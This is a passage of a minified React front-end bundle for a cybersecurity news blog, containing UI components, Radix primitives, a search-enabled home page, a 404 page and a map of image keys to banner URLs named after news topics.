"scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"]},conflictingClassGroupModifiers:{"font-size":["leading"]}}}var Fy=tS(gS);function kt(...n){return Fy(rd(n))}const Uy=Ee.forwardRef(({className:n,...e},r)=>T.jsx("div",{ref:r,className:kt("rounded-lg border bg-card text-card-foreground shadow-sm",n),...e}));Uy.displayName="Card";const zy=Ee.forwardRef(({className:n,...e},r)=>T.jsx("div",{ref:r,className:kt("flex flex-col space-y-1.5 p-6",n),...e}));zy.displayName="CardHeader";const Vy=Ee.forwardRef(({className:n,...e},r)=>T.jsx("h3",{ref:r,className:kt("text-2xl font-semibold leading-none tracking-tight",n),...e}));Vy.displayName="CardTitle";const Wy=Ee.forwardRef(({className:n,...e},r)=>T.jsx("p",{ref:r,className:kt("text-sm text-muted-foreground",n),...e}));Wy.displayName="CardDescription";const $y=Ee.forwardRef(({className:n,...e},r)=>T.jsx("div",{ref:r,className:kt("p-6 pt-0",n),...e}));$y.displayName="CardContent";const Hy=Ee.forwardRef(({className:n,...e},r)=>T.jsx("div",{ref:r,className:kt("flex items-center p-6 pt-0",n),...e}));Hy.displayName="CardFooter";function Tg(n,e){if(typeof n=="function")return n(e);n!=null&&(n.current=e)}function qy(...n){return e=>{let r=!1;const s=n.map(a=>{const l=Tg(a,e);return!r&&typeof l=="function"&&(r=!0),l});if(r)return()=>{for(let a=0;a<s.length;a++){const l=s[a];typeof l=="function"?l():Tg(n[a],null)}}}}function kr(...n){return C.useCallback(qy(...n),n)}function fa(n){const e=yS(n),r=C.forwardRef((s,a)=>{const{children:l,...c}=s,d=C.Children.toArray(l),p=d.find(vS);if(p){const f=p.props.children,m=d.map(y=>y===p?C.Children.count(f)>1?C.Children.only(null):C.isValidElement(f)?f.props.children:null:y);return T.jsx(e,{...c,ref:a,children:C.isValidElement(f)?C.cloneElement(f,void 0,m):null})}return T.jsx(e,{...c,ref:a,children:l})});return r.displayName=`${n}.Slot`,r}var mS=fa("Slot");function yS(n){const e=C.forwardRef((r,s)=>{const{children:a,...l}=r;if(C.isValidElement(a)){const c=kS(a),d=wS(l,a.props);return a.type!==C.Fragment&&(d.ref=s?qy(s,c):c),C.cloneElement(a,d)}return C.Children.count(a)>1?C.Children.only(null):null});return e.displayName=`${n}.SlotClone`,e}var bS=Symbol("radix.slottable");function vS(n){return C.isValidElement(n)&&typeof n.type=="function"&&"__radixId"in n.type&&n.type.__radixId===bS}function wS(n,e){const r={...e};for(const s in e){const a=n[s],l=e[s];/^on[A-Z]/.test(s)?a&&l?r[s]=(...d)=>{const p=l(...d);return a(...d),p}:a&&(r[s]=a):s==="style"?r[s]={...a,...l}:s==="className"&&(r[s]=[a,l].filter(Boolean).join(" "))}return{...n,...r}}function kS(n){let e=Object.getOwnPropertyDescriptor(n.props,"ref")?.get,r=e&&"isReactWarning"in e&&e.isReactWarning;return r?n.ref:(e=Object.getOwnPropertyDescriptor(n,"ref")?.get,r=e&&"isReactWarning"in e&&e.isReactWarning,r?n.props.ref:n.props.ref||n.ref)}const Ag=n=>typeof n=="boolean"?`${n}`:n===0?"0":n,Cg=rd,Gy=(n,e)=>r=>{var s;if(e?.variants==null)return Cg(n,r?.class,r?.className);const{variants:a,defaultVariants:l}=e,c=Object.keys(a).map(f=>{const m=r?.[f],y=l?.[f];if(m===null)return null;const v=Ag(m)||Ag(y);return a[f][v]}),d=r&&Object.entries(r).reduce((f,m)=>{let[y,v]=m;return v===void 0||(f[y]=v),f},{}),p=e==null||(s=e.compoundVariants)===null||s===void 0?void 0:s.reduce((f,m)=>{let{class:y,className:v,...w}=m;return Object.entries(w).every(A=>{let[k,x]=A;return Array.isArray(x)?x.includes({...l,...d}[k]):{...l,...d}[k]===x})?[...f,y,v]:f},[]);return Cg(n,c,p,r?.class,r?.className)},xS=Gy("inline-flex items-center justify-center rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),Kt=Ee.forwardRef(({className:n,variant:e,size:r,asChild:s=!1,...a},l)=>{const c=s?mS:"button";return T.jsx(c,{className:kt(xS({variant:e,size:r,className:n})),ref:l,...a})});Kt.displayName="Button";const ga={default:"https://images.unsplash.com/photo-1549287540-b5e39fc85fa1",zeroDayThreat:"https://ethicalbyte.in/blogs/img/1.webp",phishingConcept:"https://ethicalbyte.in/blogs/img/2.webp",passwordSecurity:"https://ethicalbyte.in/blogs/img/3.webp",vpnConcept:"https://ethicalbyte.in/blogs/img/4.webp",ransomwareLock:"https://ethicalbyte.in/blogs/img/5.webp",iotNetwork:"https://ethicalbyte.in/blogs/img/6.webp",aiCyberThreat:"https://ethicalbyte.in/blogs/img/7.webp",linuxKernelBreach:"https://ethicalbyte.in/blogs/img/8.webp",socialThreats:"https://ethicalbyte.in/blogs/img/9.webp",apt29GmailAttack:"https://ethicalbyte.in/blogs/img/10.webp",passwordLeak16B:"https://ethicalbyte.in/blogs/img/11.webp",gmailPasskeyUpgrade:"https://ethicalbyte.in/blogs/img/12.webp",iranTvHijack:"https://ethicalbyte.in/blogs/img/13.webp",smishingAlert:"https://ethicalbyte.in/blogs/img/14.webp",weeklyCyberRecap:"https://ethicalbyte.in/blogs/img/15.webp",deleteHarmfulApps:"https://ethicalbyte.in/blogs/img/16.webp",chromeZeroDayExploit:"https://ethicalbyte.in/blogs/img/17.webp",fileUploadPhishing:"https://ethicalbyte.in/blogs/img/18.webp",scatteredSpiderAirline:"https://ethicalbyte.in/blogs/img/19.webp",chromeFirefoxUpdate:"https://ethicalbyte.in/blogs/img/20.webp",northKoreaZoomMalware:"https://ethicalbyte.in/blogs/img/21.webp",googleDataVerdict:"https://ethicalbyte.in/blogs/img/22.webp",taiwanChineseApps:"https://ethicalbyte.in/blogs/img/23.webp",catwatchfulSpyware:"https://ethicalbyte.in/blogs/img/24.webp",vishingQantas:"https://ethicalbyte.in/blogs/img/25.webp",euProtectEU:"https://ethicalbyte.in/blogs/img/26.webp",ingramMicroRansomware:"https://ethicalbyte.in/blogs/img/27.webp",maliciousEsDomains:"https://ethicalbyte.in/blogs/img/28.webp",perfektBlueCarHack:"https://ethicalbyte.in/blogs/img/29.webp",cyberTalk2025Banner:"https://ethicalbyte.in/blogs/img/30.webp",deepfakeThreatBanner:"https://ethicalbyte.in/blogs/img/31.webp",nipponSteelBreachBanner:"https://ethicalbyte.in/blogs/img/32.webp",ntroPhishingBanner:"https://ethicalbyte.in/blogs/img/33.webp",evChargingVulnBanner:"https://ethicalbyte.in/blogs/img/34.webp",jackMessagingAppBanner:"https://ethicalbyte.in/blogs/img/35.webp",louisVuittonBreachBanner:"https://ethicalbyte.in/blogs/img/36.webp",oracleJuly2025PatchBanner:"https://ethicalbyte.in/blogs/img/37.webp",bciCybersecurityBanner:"https://ethicalbyte.in/blogs/img/38.webp",mcdonaldsAIHiringBreachBanner:"https://ethicalbyte.in/blogs/img/39.webp",blockchainThreatIntelBanner:"https://ethicalbyte.in/blogs/img/40.webp",tiktokEUPrivacyBanner:"https://ethicalbyte.in/blogs/img/41.webp",massistantSurveillanceBanner:"https://ethicalbyte.in/blogs/img/42.webp",apt41AfricaSharePointBanner:"https://ethicalbyte.in/blogs/img/43.webp",coindcxBreachBanner:"https://ethicalbyte.in/blogs/img/44.webp",staccAttackBanner:"https://ethicalbyte.in/blogs/img/45.webp",usbCableHackingBanner:"https://ethicalbyte.in/blogs/img/46.webp",laughingMantisBanner:"https://ethicalbyte.in/blogs/img/47.webp",allianzBreachBanner:"https://ethicalbyte.in/blogs/img/48.webp",cargoTalonBanner:"https://ethicalbyte.in/blogs/img/49.webp",vastavAIDeepfakeBanner:"https://ethicalbyte.in/blogs/img/50.webp",quantumBitcoinBanner:"https://ethicalbyte.in/blogs/img/51.webp",nigeriaAICybersecurityBanner:"https://ethicalbyte.in/blogs/img/52.webp",microsoftOauthTycoonAttack:"https://ethicalbyte.in/blogs/img/53.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/54.webp",nvidiaTritonExploit:"https://ethicalbyte.in/blogs/img/55.webp",generativeAICyberBanner:"https://ethicalbyte.in/blogs/img/56.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/57.webp",geminicalendarexploitbanner:"https://ethicalbyte.in/blogs/img/58.webp",lenovobadcamexploitbanner:"https://ethicalbyte.in/blogs/img/59.webp",malwareTop5:"https://ethicalbyte.in/blogs/img/60.webp",shinyspider2025:"https://ethicalbyte.in/blogs/img/61.webp",aimlinnovations2025:"https://ethicalbyte.in/blogs/img/62.webp",aideepfakecyberattacks:"https://ethicalbyte.in/blogs/img/63.webp",ermacTrojanLeak:"https://ethicalbyte.in/blogs/img/64.webp",gmailPhishVoicemailBanner:"https://ethicalbyte.in/blogs/img/65.webp",rapperbotDdosBanner:"https://ethicalbyte.in/blogs/img/66.webp",aiBrowserPromptFix2025:"https://ethicalbyte.in/blogs/img/67.webp",quirkyloadermalware2025:"https://ethicalbyte.in/blogs/img/68.webp",operationSerengetiBanner:"https://ethicalbyte.in/blogs/img/69.webp",linuxFilenameMalwareBanner:"https://ethicalbyte.in/blogs/img/70.webp",upcrypterPhishingBanner:"https://ethicalbyte.in/blogs/img/71.webp",storm0501CloudTakeoverBanner:"https://ethicalbyte.in/blogs/img/72.webp",tamperedchefMalwareBanner:"https://ethicalbyte.in/blogs/img/73.webp",velociraptorAbuseBanner:"https://ethicalbyte.in/blogs/img/74.webp",zscalerSalesloftBreachBanner:"https://ethicalbyte.in/blogs/img/75.webp",mystrodxBackdoorBanner:"https://ethicalbyte.in/blogs/img/76.webp",hexstrikeAiWeaponizedBanner:"https://ethicalbyte.in/blogs/img/77.webp",genaiChatGPTLeakBanner:"https://ethicalbyte.in/blogs/img/78.webp",castleRATBanner:"https://ethicalbyte.in/blogs/img/79.webp",barrelFireBanner:"https://ethicalbyte.in/blogs/img/80.webp",fakeHireBanner:"https://ethicalbyte.in/blogs/img/81.webp",pixel10C2PABanner:"https://ethicalbyte.in/blogs/img/82.webp",hybridPetyaBanner:"https://ethicalbyte.in/blogs/img/83.webp",fbiSalesforceBreach:"https://ethicalbyte.in/blogs/img/84.webp",browserAttacks2025Banner:"https://ethicalbyte.in/blogs/img/85.webp",aiAgentControlBanner:"https://ethicalbyte.in/blogs/img/86.webp",venomHotelBanner:"https://ethicalbyte.in/blogs/img/87.webp",aiQuantumCyberBanner:"https://ethicalbyte.in/blogs/img/88.webp",sapSovereignCloudIndia:"https://ethicalbyte.in/blogs/img/89.webp",autonomousAICyberBanner:"https://ethicalbyte.in/blogs/img/90.webp",europeCryptoScam2025:"https://ethicalbyte.in/blogs/img/91.webp",brickstormBackdoorBanner:"https://ethicalbyte.in/blogs/img/92.webp",oneplusSMSVuln:"https://ethicalbyte.in/blogs/img/93.webp",evilaiMalwareBanner:"https://ethicalbyte.in/blogs/img/94.webp",ukBitcoinBust:"https://ethicalbyte.in/blogs/img/95.webp",ukAppleBackdoorBanner:"https://ethicalbyte.in/blogs/img/96.webp",cometJackingBanner:"https://ethicalbyte.in/blogs/img/97.webp",oracleEBSZeroDayBanner:"https://ethicalbyte.in/blogs/img/98.webp",weeklyRecapBannerOct2025:"https://ethicalbyte.in/blogs/img/99.webp",gh0stRat100thBlogBanner:"https://ethicalbyte.in/blogs/img/100.webp"},Ky=({post:n})=>{const{theme:e}=Gn(),r={hidden:{opacity:0,y:20},visible:{opacity:1,y:0},hover:{scale:1.02,boxShadow:e==="dark"?"0px 10px 20px hsla(var(--primary), 0.25)":"0px 8px 25px rgba(0, 0, 0, 0.08)"}},s=e==="dark"?"bg-card border-border hover:border-primary/60":"bg-card border-border hover:border-primary/40",a=e==="dark"?"text-primary hover:text-primary/80":"text-foreground hover:text-primary",l=e==="dark"?"text-slate-400":"text-muted-foreground",c=e==="dark"?"text-slate-300":"text-foreground/80",d=e==="dark"?"text-accent hover:text-accent/80":"text-primary hover:text-primary/80",p=ga[n.imageKey]||ga.default,f=`#/post/${n.id}`;return T.jsx(it.div,{variants:r,whileHover:"hover",className:"h-full group",children:T.jsxs(Uy,{className:`flex flex-col h-full ${s} transition-all duration-300 shadow-md hover:shadow-xl rounded-xl overflow-hidden`,children:[T.jsxs(zy,{className:"p-0",children:[T.jsx("div",{className:"mb-4 h-48 w-full overflow-hidden",children:T.jsx("a",{href:f,"aria-label":`Read more about ${n.title}`,children:T.jsx("img",{className:"w-full h-full object-cover transition-transform duration-300 group-hover:scale-105",alt:`Blog post illustration for ${n.title}`,src:p})})}),T.jsxs("div",{className:"p-6",children:[T.jsx(Vy,{className:`text-xl font-semibold ${a} transition-colors`,children:T.jsx("a",{href:f,children:n.title})}),T.jsxs(Wy,{className:`${l} text-xs flex flex-wrap items-center gap-x-3 gap-y-1 mt-2`,children:[T.jsxs("span",{className:"flex items-center",children:[T.jsx(am,{size:14,className:"mr-1"})," ",n.date]}),T.jsxs("span",{className:"flex items-center",children:[T.jsx(cm,{size:14,className:"mr-1"})," ",n.author]})]})]})]}),T.jsx($y,{className:"flex-grow px-6 pb-4",children:T.jsx("p",{className:`${c} leading-relaxed text-sm`,children:n.summary})}),T.jsx(Hy,{className:"px-6 pb-6",children:T.jsx(Kt,{asChild:!0,variant:"link",className:`${d} p-0 text-sm`,children:T.jsxs("a",{href:f,className:"flex items-center font-semibold",children:["Read More ",T.jsx(om,{size:16,className:"ml-1"})]})})})]})})};function SS(...n){return Fy(rd(n))}const _a=Ee.forwardRef(({className:n,type:e,...r},s)=>T.jsx("input",{type:e,className:SS("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",n),ref:s,...r}));_a.displayName="Input";const $c=6,TS=({searchTerm:n,setSearchTerm:e})=>{const{theme:r}=Gn(),[s,a]=C.useState([]),l=C.useMemo(()=>[...nd].sort((x,B)=>new Date(B.date)-new Date(x.date)),[]),c=C.useMemo(()=>n?l.filter(x=>x.title.toLowerCase().includes(n.toLowerCase())||x.summary.toLowerCase().includes(n.toLowerCase())||x.tags&&x.tags.some(B=>B.toLowerCase().includes(n.toLowerCase()))):l.slice(0,$c),[n,l]);C.useEffect(()=>{a(n?c:l.slice(0,$c))},[n,l,c]);const d=C.useCallback(x=>{e(x.target.value)},[e]),p=C.useCallback(()=>{e("")},[e]),f={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},m=r==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",y=r==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",v=r==="dark"?"text-slate-400":"text-muted-foreground",w=r==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",A=r==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return T.jsxs("div",{className:"space-y-12",children:[T.jsxs(it.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${m} rounded-xl shadow-lg p-8`,children:[T.jsx("h1",{className:`text-5xl md:text-6xl font-bold mb-6 ${y}`,children:"CyberSec Insights"}),T.jsx("p",{className:`text-lg md:text-xl ${v} max-w-3xl mx-auto mb-10`,children:"Your trusted source for the latest in cybersecurity news, threats, and best practices. Stay informed, stay secure."}),T.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[T.jsx(lm,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${A} transition-colors`}),T.jsx(_a,{type:"search",placeholder:"Search recent articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${w}`,value:n,onChange:d}),n&&T.jsx("button",{onClick:p,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:T.jsx(sa,{size:20})})]})]}),n&&s.length>0&&T.jsxs(it.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[T.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",T.jsx("span",{className:"text-primary",children:n})]}),T.jsxs("p",{className:"text-muted-foreground",children:[s.length," post(s) found."]})]}),s.length===0&&T.jsxs(it.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[T.jsx(sa,{size:48,className:"mx-auto text-destructive mb-4"}),T.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),T.jsx("p",{className:"text-muted-foreground",children:n?`Sorry, we couldn't find any articles matching "${n}". Try a different search term or view all posts.`:"There are no recent articles available. Check back soon!"})]}),s.length>0&&T.jsx(it.section,{variants:f,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:s.map(x=>T.jsx(Ky,{post:x},x.id))}),!n&&l.length>$c&&T.jsx(it.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:.3},className:"text-center mt-12",children:T.jsx(Kt,{asChild:!0,size:"lg",className:"bg-primary hover:bg-primary/90 text-primary-foreground shadow-md hover:shadow-lg transition-all",children:T.jsxs("a",{href:"#/all-blogs",children:["View All Posts ",T.jsx(om,{size:20,className:"ml-2"})]})})})]})},Jy=()=>{const{theme:n}=Gn(),e=n==="dark"?"text-amber-400":"text-amber-500",r=n==="dark"?"text-red-400":"text-red-500",s=n==="dark"?"text-slate-300":"text-foreground/90",a=n==="dark"?"text-slate-400":"text-muted-foreground",l=n==="dark"?"text-background bg-sky-400 hover:bg-sky-500 hover:shadow-sky-500/50":"text-primary-foreground bg-primary hover:bg-primary/90 hover:shadow-primary/30";return T.jsxs(it.div,{initial:{opacity:0,scale:.9},animate:{opacity:1,scale:1},transition:{duration:.5},className:"flex flex-col items-center justify-center min-h-[70vh] text-center p-6",children:[T.jsx(it.div,{initial:{y:-20,opacity:0},animate:{y:0,opacity:1},transition:{delay:.2,type:"spring",stiffness:120},children:T.jsx(s0,{className:`mx-auto h-24 w-24 ${e} mb-6`})}),T.jsx("h1",{className:`text-6xl font-extrabold ${r} mb-4`,children:"404"}),T.jsx("h2",{className:`text-3xl font-semibold ${s} mb-6`,children:"Content Not Found"}),T.jsx("p",{className:`text-lg ${a} max-w-md mx-auto mb-8`,children:"Oops! The content you're looking for at this URL path doesn't exist. It might have been moved or the link is incorrect."}),T.jsxs("a",{href:"#/",className:`inline-flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md ${l} transition-all shadow-lg`,children:[T.jsx(h0,{size:20,className:"mr-2"}),"Go Back Home"]})]})},Qy=Ee.forwardRef(({className:n,...e},r)=>T.jsx("textarea",{className:kt("flex min-h-[80px] w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",n),ref:r,...e}));Qy.displayName="Textarea";var sd=im();const AS=wa(sd);function Et(n,e,{checkForDefaultPrevented:r=!0}={}){return function(a){if(n?.(a),r===!1||!a.defaultPrevented)return e?.(a)}}function Yy(n,e=[]){let r=[];function s(l,c){const d=C.createContext(c),p=r.length;r=[...r,c];const f=y=>{const{scope:v,children:w,...A}=y,k=v?.[n]?.[p]||d,x=C.useMemo(()=>A,Object.values(A));return T.jsx(k.Provider,{value:x,children:w})};f.displayName=l+"Provider";function m(y,v){const w=v?.[n]?.[p]||d,A=C.useContext(w);if(A)return A;if(c!==void 0)return c;throw new Error(`\`${y}\` must be used within \`${l}\``)}return[f,m]}const a=()=>{const l=r.map(c=>C.createContext(c));return function(d){const p=d?.[n]||l;return C.useMemo(()=>({[`__scope${n}`]:{...d,[n]:p}}),[d,p])}};return a.scopeName=n,[s,CS(a,...e)]}function CS(...n){const e=n[0];if(n.length===1)return e;const r=()=>{const s=n.map(a=>({useScope:a(),scopeName:a.scopeName}));return function(l){const c=s.reduce((d,{useScope:p,scopeName:f})=>{const y=p(l)[`__scope${f}`];return{...d,...y}},{});return C.useMemo(()=>({[`__scope${e.scopeName}`]:c}),[c])}};return r.scopeName=e.scopeName,r}function ES(n){const e=n+"CollectionProvider",[r,s]=Yy(e),[a,l]=r(e,{collectionRef:{current:null},itemMap:new Map}),c=k=>{const{scope:x,children:B}=k,_=Ee.useRef(null),P=Ee.useRef(new Map).current;return T.jsx(a,{scope:x,itemMap:P,collectionRef:_,children:B})};c.displayName=e;const d=n+"CollectionSlot",p=fa(d),f=Ee.forwardRef((k,x)=>{const{scope:B,children:_}=k,P=l(d,B),M=kr(x,P.collectionRef);return T.jsx(p,{ref:M,children:_})});f.displayName=d;const m=n+"CollectionItemSlot",y="data-radix-collection-item",v=fa(m),w=Ee.forwardRef((k,x)=>{const{scope:B,children:_,...P}=k,M=Ee.useRef(null),V=kr(x,M),U=l(m,B);return Ee.useEffect(()=>(U.itemMap.set(M,{ref:M,...P}),()=>void U.itemMap.delete(M))),T.jsx(v,{[y]:"",ref:V,children:_})});w.displayName=m;function A(k){const x=l(n+"CollectionConsumer",k);return Ee.useCallback(()=>{const _=x.collectionRef.current;if(!_)return[];const P=Array.from(_.querySelectorAll(`[${y}]`));return Array.from(x.itemMap.values()).sort((U,W)=>P.indexOf(U.ref.current)-P.indexOf(W.ref.current))},[x.collectionRef,x.itemMap])}return[{Provider:c,Slot:f,ItemSlot:w},A,s]}var PS=["a","button","div","form","h2","h3","img","input","label","li","nav","ol","p","select","span","svg","ul"],nn=PS.reduce((n,e)=>{const r=fa(`Primitive.${e}`),s=C.forwardRef((a,l)=>{const{asChild:c,...d}=a,p=c?r:e;return typeof window<"u"&&(window[Symbol.for("radix-ui")]=!0),T.jsx(p,{...d,ref:l})});return s.displayName=`Primitive.${e}`,{...n,[e]:s}},{});function Xy(n,e){n&&sd.flushSync(()=>n.dispatchEvent(e))}function xr(n){const e=C.useRef(n);return C.useEffect(()=>{e.current=n}),C.useMemo(()=>(...r)=>e.current?.(...r),[])}function _S(n,e=globalThis?.document){const r=xr(n);C.useEffect(()=>{const s=a=>{a.key==="Escape"&&r(a)};return e.addEventListener("keydown",s,{capture:!0}),()=>e.removeEventListener("keydown",s,{capture:!0})},[r,e])}var IS="DismissableLayer",bu="dismissableLayer.update",RS="dismissableLayer.pointerDownOutside",DS="dismissableLayer.focusOutside",Eg,Zy=C.createContext({layers:new Set,layersWithOutsidePointerEventsDisabled:new Set,branches:new Set}),eb=C.forwardRef((n,e)=>{const{disableOutsidePointerEvents:r=!1,onEscapeKeyDown:s,onPointerDownOutside:a,onFocusOutside:l,onInteractOutside:c,onDismiss:d,...p}=n,f=C.useContext(Zy),[m,y]=C.useState(null),v=m?.ownerDocument??globalThis?.document,[,w]=C.useState({}),A=kr(e,W=>y(W)),k=Array.from(f.layers),[x]=[...f.layersWithOutsidePointerEventsDisabled].slice(-1),B=k.indexOf(x),_=m?k.indexOf(m):-1,P=f.layersWithOutsidePointerEventsDisabled.size>0,M=_>=B,V=jS(W=>{const G=W.target,ee=[...f.branches].some(ye=>ye.contains(G));!M||ee||(a?.(W),c?.(W),W.defaultPrevented||d?.())},v),U=MS(W=>{const G=W.target;[...f.branches].some(ye=>ye.contains(G))||(l?.(W),c?.(W),W.defaultPrevented||d?.())},v);return _S(W=>{_===f.layers.size-1&&(s?.(W),!W.defaultPrevented&&d&&(W.preventDefault(),d()))},v),C.useEffect(()=>{if(m)return r&&(f.layersWithOutsidePointerEventsDisabled.size===0&&(Eg=v.body.style.pointerEvents,v.body.style.pointerEvents="none"),f.layersWithOutsidePointerEventsDisabled.add(m)),f.layers.add(m),Pg(),()=>{r&&f.layersWithOutsidePointerEventsDisabled.size===1&&(v.body.style.pointerEvents=Eg)}},[m,v,r,f]),C.useEffect(()=>()=>{m&&(f.layers.delete(m),f.layersWithOutsidePointerEventsDisabled.delete(m),Pg())},[m,f]),C.useEffect(()=>{const W=()=>w({});return document.addEventListener(bu,W),()=>document.removeEventListener(bu,W)},[]),T.jsx(nn.div,{...p,ref:A,style:{pointerEvents:P?M?"auto":"none":void 0,...n.style},onFocusCapture:Et(n.onFocusCapture,U.onFocusCapture),onBlurCapture:Et(n.onBlurCapture,U.onBlurCapture),onPointerDownCapture:Et(n.onPointerDownCapture,V.onPointerDownCapture)})});eb.displayName=IS;var OS="DismissableLayerBranch",tb=C.forwardRef((n,e)=>{const r=C.useContext(Zy),s=C.useRef(null),a=kr(e,s);return C.useEffect(()=>{const l=s.current;if(l)return r.branches.add(l),()=>{r.branches.delete(l)}},[r.branches]),T.jsx(nn.div,{...n,ref:a})});tb.displayName=OS;function jS(n,e=globalThis?.document){const r=xr(n),s=C.useRef(!1),a=C.useRef(()=>{});return C.useEffect(()=>{const l=d=>{if(d.target&&!s.current){let p=function(){nb(RS,r,f,{discrete:!0})};const f={originalEvent:d};d.pointerType==="touch"?(e.removeEventListener("click",a.current),a.current=p,e.addEventListener("click",a.current,{once:!0})):p()}else e.removeEventListener("click",a.current);s.current=!1},c=window.setTimeout(()=>{e.addEventListener("pointerdown",l)},0);return()=>{window.clearTimeout(c),e.removeEventListener("pointerdown",l),e.removeEventListener("click",a.current)}},[e,r]),{onPointerDownCapture:()=>s.current=!0}}function MS(n,e=globalThis?.document){const r=xr(n),s=C.useRef(!1);return C.useEffect(()=>{const a=l=>{l.target&&!s.current&&nb(DS,r,{originalEvent:l},{discrete:!1})};return e.addEventListener("focusin",a),()=>e.removeEventListener("focusin",a)},[e,r]),{onFocusCapture:()=>s.current=!0,onBlurCapture:()=>s.current=!1}}function Pg(){const n=new CustomEvent(bu);document.dispatchEvent(n)}function nb(n,e,r,{discrete:s}){const a=r.originalEvent.target,l=new CustomEvent(n,{bubbles:!1,cancelable:!0,detail:r});e&&a.addEventListener(n,e,{once:!0}),s?Xy(a,l):a.dispatchEvent(l)}var BS=eb,NS=tb,Ss=globalThis?.document?C.useLayoutEffect:()=>{},LS="Portal",rb=C.forwardRef((n,e)=>{const{container:r,...s}=n,[a,l]=C.useState(!1);Ss(()=>l(!0),[]);const c=r||a&&globalThis?.document?.body;return c?AS.createPortal(T.jsx(nn.div,{...s,ref:e}),c):null});rb.displayName=LS;function FS(n,e){return C.useReducer((r,s)=>e[r][s]??r,n)}var ib=n=>{const{present:e,children:r}=n,s=US(e),a=typeof r=="function"?r({present:s.isPresent}):C.Children.only(r),l=kr(s.ref,zS(a));return typeof r=="function"||s.isPresent?C.cloneElement(a,{ref:l}):null};ib.displayName="Presence";function US(n){const[e,r]=C.useState(),s=C.useRef(null),a=C.useRef(n),l=C.useRef("none"),c=n?"mounted":"unmounted",[d,p]=FS(c,{mounted:{UNMOUNT:"unmounted",ANIMATION_OUT:"unmountSuspended"},unmountSuspended:{MOUNT:"mounted",ANIMATION_END:"unmounted"},unmounted:{MOUNT:"mounted"}});return C.useEffect(()=>{const f=Jo(s.current);l.current=d==="mounted"?f:"none"},[d]),Ss(()=>{const f=s.current,m=a.current;if(m!==n){const v=l.current,w=Jo(f);n?p("MOUNT"):w==="none"||f?.display==="none"?p("UNMOUNT"):p(m&&v!==w?"ANIMATION_OUT":"UNMOUNT"),a.current=n}},[n,p]),Ss(()=>{if(e){let f;const m=e.ownerDocument.defaultView??window,y=w=>{const k=Jo(s.current).includes(CSS.escape(w.animationName));if(w.target===e&&k&&(p("ANIMATION_END"),!a.current)){const x=e.style.animationFillMode;e.style.animationFillMode="forwards",f=m.setTimeout(()=>{e.style.animationFillMode==="forwards"&&(e.style.animationFillMode=x)})}},v=w=>{w.target===e&&(l.current=Jo(s.current))};return e.addEventListener("animationstart",v),e.addEventListener("animationcancel",y),e.addEventListener("animationend",y),()=>{m.clearTimeout(f),e.removeEventListener("animationstart",v),e.removeEventListener("animationcancel",y),e.removeEventListener("animationend",y)}}else p("ANIMATION_END")},[e,p]),{isPresent:["mounted","unmountSuspended"].includes(d),ref:C.useCallback(f=>{s.current=f?getComputedStyle(f):null,r(f)},[])}}function Jo(n){return n?.animationName||"none"}function zS(n){let e=Object.getOwnPropertyDescriptor(n.props,"ref")?.get,r=e&&"isReactWarning"in e&&e.isReactWarning;return r?n.ref:(e=Object.getOwnPropertyDescriptor(n,"ref")?.get,r=e&&"isReactWarning"in e&&e.isReactWarning,r?n.props.ref:n.props.ref||n.ref)}var VS=Qw[" useInsertionEffect ".trim().toString()]||Ss;function 